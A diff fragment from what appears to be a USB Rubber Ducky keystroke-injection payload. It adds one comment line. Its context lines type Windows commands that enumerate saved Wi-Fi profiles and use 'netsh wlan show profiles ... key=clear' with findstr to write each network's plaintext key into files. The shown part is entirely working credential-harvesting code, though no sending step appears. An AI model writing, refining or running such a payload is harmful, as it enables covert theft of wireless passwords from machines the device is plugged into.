@@ -177,6 +177,7 @@ REM --> Second for command to fix spaces enfront of SSID's
 STRING for /f "tokens=1 delims= "  %a in (a) do echo %a>>b
 ENTER
 REM --> Get info for each SSID
+REM Did not refine information further because it wouldn't be in the right order
 REM FIX THIS: Authentication is duplicated
 STRING del a & for /f "tokens=*"  %a in (b) do (netsh wlan show profiles "%a"  key=clear|findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"|findstr /v "broadcast"| findstr /v "Radio">>%a.x)
 ENTER
